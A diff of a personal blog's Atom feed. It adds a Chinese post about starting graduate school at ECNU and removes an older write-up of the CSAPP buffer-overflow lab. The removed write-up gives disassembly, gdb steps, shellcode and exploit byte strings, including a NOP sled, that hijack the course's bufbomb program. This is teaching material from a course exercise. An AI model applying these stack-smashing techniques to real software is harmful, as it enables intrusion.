@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://xinqiu.me/"/>
-  <updated>2018-08-07T08:40:38.000Z</updated>
+  <updated>2018-09-21T13:52:43.000Z</updated>
   <id>http://xinqiu.me/</id>
   
   <author>
@@ -14,6 +14,35 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>在ECNU的新生活</title>
+    <link href="http://xinqiu.me/2018/09/21/xin-start/"/>
+    <id>http://xinqiu.me/2018/09/21/xin-start/</id>
+    <published>2018-09-21T12:39:49.000Z</published>
+    <updated>2018-09-21T13:52:43.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="u56DE_u5FC6"><a href="#u56DE_u5FC6" class="headerlink" title="回忆"></a>回忆</h2><p>仔细想想，其实已经很久没有写关于生活的日志了，一方面是因为懒，另一方面还是因为懒。自准备考研到如今开学半个月以来，心态上一直在变化。其实当初一开始的选择是五角场的复旦，我怀念那个努力拼搏的自己，怀念那个低调内敛的自己，怀念那个很有冲劲的自己，但最终还是败给了父母的劝告。有担心发挥不好，有在乎年岁已高，因为没有二战的身体了，所以在最后的一天改了志愿。</p>
+<p>如果坚持自己的选择，那现在的我，会在哪儿呢？</p>
+<p>可能是换到了压力小点的华师，自己的状态上明显不如前期，可能也是因为累了，但在考研教室的氛围里，互相鼓励着，坚持着。最后确实笔试发挥的很烂。当时那段时间心态真的崩了，找工作感觉自己啥的不会，调剂又感觉其他学校看不上我本科的学历。好在寒假那段时间一直在刷着OJ，没想到最后复试通知出来，真的今年意外有了机试。当初复试名单出现的时候，发现排名又进了7位，那时候感觉，距离71的名额又近了一些，仿佛又有逆袭的机会。因为专硕只有面试，所以不知道会问什么，虽然又看了OS和网络，但都是看的很草。但面试的时候，可能是简历准备的还行，以及一些证书，再加上本科的科研经历，或多或少有了些帮助。面试的老师里有我挺想找的Y老师，但寒假发了邮件一直没回复。当时直接就是Y老师面了我，针对的是简历上提的一些问题，自我感觉回到还行，另外一个老师问了爬虫相关问题，也回答还行吧。但英语翻译和口语，因为是第一个，非常紧张，以至于这两项很差。好在晚上上机做的还行，让我又有了点希望。出了成绩没有留校第二天去找各个导师面试才是我最后悔的事，因为多去找几个导师面试一下，毕竟从初试81到最后总成绩37，感觉应该能去碰碰运气。第二天邮件联系上了P老师，当时他就要了我，我也很开心，因为可以进AIDA，但结果今年数据系名额给的少，我被鸽了。这里的后话是，确定完导师第二题，Y老师联系上了我。。。</p>
+<p>在8月第二次调剂导师的时候，找到了现在的导师L老师，L老师人非常好，给我报了交大的暑期机器学习班，实验室还给我配了两台显示器。</p>
+<p><img src="http://xinqiu.me/2018/09/21/xin-start/1.jpg" alt=""></p>
+<p><img src="http://xinqiu.me/2018/09/21/xin-start/2.jpg" alt=""></p>
+<blockquote>
+<p>图为参加数模的熬夜状态</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;u56DE_u5FC6&quot;&gt;&lt;a href=&quot;#u56DE_u5FC6&quot; class=&quot;headerlink&quot; title=&quot;回忆&quot;&gt;&lt;/a&gt;回忆&lt;/h2&gt;&lt;p&gt;仔细想想，其实已经很久没有写关于生活的日志了，一方面是因为懒，另一方面还是因为懒。自准备考研到如今开学半
+    
+    </summary>
+    
+    
+      <category term="Life" scheme="http://xinqiu.me/tags/Life/"/>
+    
+  </entry>
   
   <entry>
     <title>在Python中使用gRPC</title>
@@ -4788,309 +4817,6 @@ t2<span class="token punctuation">.</span>start<span class="token punctuation">(
     
     
       <category term="Life" scheme="http://xinqiu.me/tags/Life/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CSAPP Lab3 解题分析</title>
-    <link href="http://xinqiu.me/2016/03/30/csapp-lab3-buflab/"/>
-    <id>http://xinqiu.me/2016/03/30/csapp-lab3-buflab/</id>
-    <published>2016-03-29T16:00:00.000Z</published>
-    <updated>2016-04-07T02:02:46.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>首先，使用tar xvf命令解压文件后，会有3个可执行的二进制文件bufbomb，hex2raw，makecookie。参考<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf" target="_blank" rel="external">write-up</a>。</p>
-<!--toc-->
-<h2 id="Level_0"><a href="#Level_0" class="headerlink" title="Level 0"></a>Level 0</h2><p>Bufbomb程序运行会读一个字符串，使用一下函数getbuf:</p>
-<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* Buffer size for getbuf */</span>
-<span class="token macro property">#<span class="token directive keyword">define</span> NORMAL_BUFFER_SIZE 32</span>
-
-<span class="token keyword">int</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>NORMAL_BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>Gets函数和标准库的gets功能比较相似，是读取字符串。因为Gets没有办法判断是否buf足够大，所以要用一个函数去判断长度是否小于32。将字符串传入getbuf函数中，若字符串小于32，则返回1.</p>
-<pre><code>080491f4 &lt;getbuf&gt;:
- 80491f4:    55                       push   %ebp
- 80491f5:    89 e5                    mov    %esp,%ebp
- 80491f7:    83 ec 38                 sub    $0x38,%esp
- 80491fa:    8d 45 d8                 lea    -0x28(%ebp),%eax
- 80491fd:    89 04 24                 mov    %eax,(%esp)
- 8049200:    e8 f5 fa ff ff           call   8048cfa &lt;Gets&gt;
- 8049205:    b8 01 00 00 00           mov    $0x1,%eax
- 804920a:    c9                       leave  
- 804920b:    c3                       ret
-</code></pre><p>getbuf是由函数test调用:</p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   
-  <span class="token keyword">int</span> val<span class="token punctuation">;</span>   
-  <span class="token comment" spellcheck="true">/* Put canary on stack to detect possiblecorruption */</span>   
-  <span class="token keyword">volatile</span> <span class="token keyword">int</span> local <span class="token operator">=</span> <span class="token function">uniqueval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
-
-  val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
-
-  <span class="token comment" spellcheck="true">/* Check for corruption stack */</span>   
-  <span class="token keyword">if</span> <span class="token punctuation">(</span>local <span class="token operator">!=</span> <span class="token function">uniqueval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Sabotaged!: the stack has beencorrupted\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
-  <span class="token punctuation">}</span>   
-  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>   
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Boom!: getbuf returned0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>   
-    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
-  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Dud: getbuf returned0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>   
-  <span class="token punctuation">}</span>   
-<span class="token punctuation">}</span>
-</code></pre>
-<p>其中，Smoke源码： </p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">smoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Smoke!: You calledsmoke()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
-  <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
-  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
-<span class="token punctuation">}</span>
-</code></pre>
-<p>level 0 的任务是让getbuf在执行后返回时，执行smoke函数，而不是返回test函数中。</p>
-<a id="more"></a>
-<p>关于堆栈，可以参考书中的这张图 <img src="stack-frame-structure.png" alt=""></p>
-<p>根据上面的汇编代码，可以知道，首先push保存了堆指针(frame pointer)，然后%ebp保存帧指针(stack pointer)，%esp减0x38。lea把buf的指针地址-0x28(%ebp)传给了Gets函数。所以可以画出堆栈图</p>
-<pre><code>+---------------+
-|               |
-| getbuf返回地址 |
-|               |
-+---------------+
-|               |
-|     %ebp      |
-|               |
-+---------------+
-|               |
-|               |
-|               |
-|      buf      |
-|               |
-|    40 byte    |
-|               |
-|               |
-|               |
-+---------------+
-|               |
-|     %esp      |
-|               |
-+---------------+
-</code></pre><p>所以为了修改getbuf返回地址，需要在从buf开始，填充 40 + 4 = 44个字节，并且按照要求，这44个字节要是非0a数。根据汇编得到的smoke地址为08048c18，又因为是电脑小端法，所以构建的文本可以是这样的</p>
-<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08
-</code></pre><h2 id="Level_1"><a href="#Level_1" class="headerlink" title="Level 1"></a>Level 1</h2><p>bufbomb中有个函数fizz:</p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">fizz</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fizz!: You calledfizz(0x%x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
- <span class="token punctuation">}</span>
-  <span class="token keyword">else</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You calledfizz(0x%x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
-<span class="token punctuation">}</span>
-</code></pre>
-<p>题目要求和level 0类似，就是让程序执行fizz而不是返回test。区别就是这个fizz函数要求传入参数，而且传入的参数必须是自己的cookie。</p>
-<pre><code>08048c42 &lt;fizz&gt;:
- 8048c42: 55                    push   %ebp
- 8048c43: 89 e5                 mov    %esp,%ebp
- 8048c45: 83 ec 18              sub    $0x18,%esp
- 8048c48: 8b 45 08              mov    0x8(%ebp),%eax
- 8048c4b: 3b 05 08 d1 04 08     cmp    0x804d108,%eax
- 8048c51: 75 26                 jne    8048c79 &lt;fizz+0x37&gt;
- 8048c53: 89 44 24 08           mov    %eax,0x8(%esp)
- 8048c57: c7 44 24 04 ee a4 04  movl   $0x804a4ee,0x4(%esp)
- 8048c5e: 08 
- 8048c5f: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
- 8048c66: e8 55 fd ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
- 8048c6b: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
- 8048c72: e8 04 07 00 00        call   804937b &lt;validate&gt;
- 8048c77: eb 18                 jmp    8048c91 &lt;fizz+0x4f&gt;
- 8048c79: 89 44 24 08           mov    %eax,0x8(%esp)
- 8048c7d: c7 44 24 04 40 a3 04  movl   $0x804a340,0x4(%esp)
- 8048c84: 08 
- 8048c85: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
- 8048c8c: e8 2f fd ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
- 8048c91: c7 04 24 00 00 00 00  movl   $0x0,(%esp)
- 8048c98: e8 63 fc ff ff        call   8048900 &lt;exit@plt&gt;
-</code></pre><p>通过反汇编，可以发现变量val存在0x8(%ebp)这个位置，所以需要将0x8(%ebp)位置的值修改为cookie。首先前面的44位用非0a数填充，接着应该用fizz的地址08048c42替换原来的返回地址。然后添加4个非0a数，之后就应该添加cookie了。注意cookie也是用到小端表示。</p>
-<p>所以构成了:</p>
-<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 88 41 9d 21
-</code></pre><h2 id="Level_2"><a href="#Level_2" class="headerlink" title="Level 2"></a>Level 2</h2><p>让getbuf调用后执行bang函数，同时修改global_value。因为global_value是全局变量，所以并没储存在栈中。</p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> global_value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token keyword">void</span> <span class="token function">bang</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>global_value <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Bang!: You set global_value to 0x%x\n"</span><span class="token punctuation">,</span> global_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span> <span class="token keyword">else</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: global_value = 0x%x\n"</span><span class="token punctuation">,</span> global_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>通过反汇编:</p>
-<pre><code>08048c9d &lt;bang&gt;:
- 8048c9d: 55                    push   %ebp
- 8048c9e: 89 e5                 mov    %esp,%ebp
- 8048ca0: 83 ec 18              sub    $0x18,%esp
- 8048ca3: a1 00 d1 04 08        mov    0x804d100,%eax
- 8048ca8: 3b 05 08 d1 04 08     cmp    0x804d108,%eax
- 8048cae: 75 26                 jne    8048cd6 &lt;bang+0x39&gt;
- 8048cb0: 89 44 24 08           mov    %eax,0x8(%esp)
- 8048cb4: c7 44 24 04 60 a3 04  movl   $0x804a360,0x4(%esp)
- 8048cbb: 08 
- 8048cbc: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
- 8048cc3: e8 f8 fc ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
- 8048cc8: c7 04 24 02 00 00 00  movl   $0x2,(%esp)
- 8048ccf: e8 a7 06 00 00        call   804937b &lt;validate&gt;
- 8048cd4: eb 18                 jmp    8048cee &lt;bang+0x51&gt;
- 8048cd6: 89 44 24 08           mov    %eax,0x8(%esp)
- 8048cda: c7 44 24 04 0c a5 04  movl   $0x804a50c,0x4(%esp)
- 8048ce1: 08 
- 8048ce2: c7 04 24 01 00 00 00  movl   $0x1,(%esp)
- 8048ce9: e8 d2 fc ff ff        call   80489c0 &lt;__printf_chk@plt&gt;
- 8048cee: c7 04 24 00 00 00 00  movl   $0x0,(%esp)
- 8048cf5: e8 06 fc ff ff        call   8048900 &lt;exit@plt&gt;
-</code></pre><p>在gdb中先在getbuf处设置断点， 接着</p>
-<pre><code>(gdb) r -u xinqiu
-</code></pre><p>让其继续运行到断点处。根据上述的反汇编代码，用 <code>x/i 0x804d100</code> 得到</p>
-<pre><code>(gdb) x/i 0x804d100
-   0x804d100 &lt;global_value&gt;:  add    %al,(%eax)
-</code></pre><p>可以知道0x804d100放的是global_value。如果想执行某一个函数，那么就把该函数的入口地址入栈。所以能写出漏洞利用代码，将cookie传入全局变量的地址中，然后将bang的入口地址入栈，接着用ret运行。将以下汇编代码保存到level2.S中。</p>
-<pre><code>movl $0x219d4188,0x804d100
-pushl $0x08048c9d
-ret
-</code></pre><p>按照writeup，使用</p>
-<pre class=" language-bash"><code class="language-bash">gcc -m32 -c level2.S
-</code></pre>
-<p>编译，再用objdump反汇编</p>
-<pre class=" language-bash"><code class="language-bash">objdump -d level2.o <span class="token operator">></span> level2.d
-</code></pre>
-<p>通过查看level2.d</p>
-<pre><code>
-level2.o:     file format elf32-i386
-
-
-Disassembly of section .text:
-
-00000000 &lt;.text&gt;:
-   0: c7 05 00 d1 04 08 88  movl   $0x219d4188,0x804d100
-   7: 41 9d 21 
-   a: 68 9d 8c 04 08        push   $0x8048c9d
-   f: c3                    ret
-</code></pre><p>将getbuf的返回地址改成buf的首地址运行，上一个栈的4字节改成bang函数的地址。这样当在getbuf中调用ret返回时程序会跳转到buf处上面的构造的恶意函数（指令），再通过恶意函数中的ret指令跳转原栈中bang的入口地址，再进入bang函数中执行。</p>
-<p>为了得到buf的运行地址，可以使用gdb来获取</p>
-<pre><code>(gdb) p/x ($ebp-0x28)
-$1 = 0x55683168
-</code></pre><p>现在可以构造文本文件level2.txt,首先前40个字节中先用level2.d左边的操作码填充，剩余空位用00填充，接着用4个00覆盖保存的%ebp地址，最后将恶意函数的入口地址覆盖原来的返回地址，通过ret执行这个恶意函数。</p>
-<pre><code>c7 05 00 d1 04 08 88 41 9d 21 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 31 68 55
-</code></pre><h2 id="Level_3"><a href="#Level_3" class="headerlink" title="Level 3"></a>Level 3</h2><p>让getbuf正常返回到test函数，同时返回值为cookie。所以需要恢复被破坏的栈环境，将溢出前的正确的返回地址入栈，然后执行ret。因为getbuf的返回值在%eax寄存器中，溢出时会覆盖%ebp，所以需要进行恢复。</p>
-<p>使用GDB</p>
-<pre><code>(gdb) b test
-</code></pre><p>接着</p>
-<pre><code>(gdb) r -u xinqiu
-</code></pre><p>通过查看pc寄存器的位置</p>
-<pre><code>(gdb) x/10i $pc
-=&gt; 0x8048dae &lt;test+4&gt;:  sub    $0x24,%esp
-   0x8048db1 &lt;test+7&gt;:  call   0x8048d90 &lt;uniqueval&gt;
-   0x8048db6 &lt;test+12&gt;: mov    %eax,-0xc(%ebp)
-   0x8048db9 &lt;test+15&gt;: call   0x80491f4 &lt;getbuf&gt;
-   0x8048dbe &lt;test+20&gt;: mov    %eax,%ebx
-   0x8048dc0 &lt;test+22&gt;: call   0x8048d90 &lt;uniqueval&gt;
-   0x8048dc5 &lt;test+27&gt;: mov    -0xc(%ebp),%edx
-   0x8048dc8 &lt;test+30&gt;: cmp    %edx,%eax
-   0x8048dca &lt;test+32&gt;: je     0x8048dda &lt;test+48&gt;
-   0x8048dcc &lt;test+34&gt;: movl   $0x804a388,(%esp)
-</code></pre><p>可以知道在getbuf函数返回后的一条指令是 <code>0x8048dbe</code>。</p>
-<p>下面就是要构造攻击代码。需要将cookie传入eax寄存器，接着通过push入栈，ret返回来继续执行之后的代码。</p>
-<pre><code>mov $0x219d4188,%eax
-push $0x08048dbe
-ret
-</code></pre><p>类似Level 2的操作，可以得到攻击文本文件</p>
-<pre><code>b8 88 41 9d 21 68 be 8d 04 08
-c3 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 00 00
-c0 31 68 55
-68 31 68 55
-</code></pre><p>其中，倒数第二行是保存的ebp寄存器地址。</p>
-<h2 id="Level_4"><a href="#Level_4" class="headerlink" title="Level 4"></a>Level 4</h2><p>首先通过反汇编得到:</p>
-<pre><code>0804920c &lt;getbufn&gt;:
- 804920c: 55                    push   %ebp
- 804920d: 89 e5                 mov    %esp,%ebp
- 804920f: 81 ec 18 02 00 00     sub    $0x218,%esp
- 8049215: 8d 85 f8 fd ff ff     lea    -0x208(%ebp),%eax
- 804921b: 89 04 24              mov    %eax,(%esp)
- 804921e: e8 d7 fa ff ff        call   8048cfa &lt;Gets&gt;
- 8049223: b8 01 00 00 00        mov    $0x1,%eax
- 8049228: c9                    leave  
- 8049229: c3                    ret    
- 804922a: 90                    nop
- 804922b: 90                    nop
-</code></pre><p>通过 p/x ($ebp-0x208) 可以知道buf的首地址为 0x55682f88，且buf为520个字节大小。因为getbufn被执行了五次，通过gdb continue 5次，每次都查看buf地址，可以得到每次的首地址。</p>
-<pre><code>0x55682f88
-0x55682f48
-0x55682fe8
-0x55682f28
-0x55682f08
-</code></pre><p>根据testn的前一部分反汇编代码</p>
-<pre><code> 08048e26 &lt;testn&gt;:
- 8048e26: 55                    push   %ebp
- 8048e27: 89 e5                 mov    %esp,%ebp
- 8048e29: 53                    push   %ebx
- 8048e2a: 83 ec 24              sub    $0x24,%esp
- 8048e2d: e8 5e ff ff ff        call   8048d90 &lt;uniqueval&gt;
- 8048e32: 89 45 f4              mov    %eax,-0xc(%ebp)
- 8048e35: e8 d2 03 00 00        call   804920c &lt;getbufn&gt;
- 8048e3a: 89 c3                 mov    %eax,%ebx
-</code></pre><p>esp和ebp寄存器相等，所以当 push %ebx 时， 此时的 %ebp = %esp + 0x4, sub    $0x24,%esp 之后， %ebp = %esp + 0x28,这个就是%esp和%ebp每次的变化关系。此外可以知道call getbufn的下一条指令的地址为 0x8048e3a。</p>
-<p>所以得出汇编代码</p>
-<pre><code>lea 0x28(%esp),%ebp
-mov $0x219d4188,%eax
-push $0x8048e3a
-ret
-</code></pre><p>根据建议， buf的520个自己空间加上返回地址和ebp共528个字节，去掉返回地址和攻击的指令字节码，剩余的都用nop也就是0x90填充。也就是509个nop形成”nop sled”。</p>
-<pre><code>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 
-8d 6c 24 28 b8 88 41 9d 21 68 3a 8e 04 08 c3 
-e8 2f 68 55
-</code></pre><p>最后的返回地址，选择最大buf地址来覆盖，也就是用0x55682f08。</p>
-<p>值得注意的是，在运行hex2raw程序时需要添上 -n 这个参数。</p>
-<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>BufLab 算是完成了，稍微对模拟缓冲区溢出熟悉了一点，加深了对程序堆栈的理解。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      csapp
-    
-    </summary>
-    
-    
-      <category term="csapp" scheme="http://xinqiu.me/tags/csapp/"/>
     
   </entry>
   
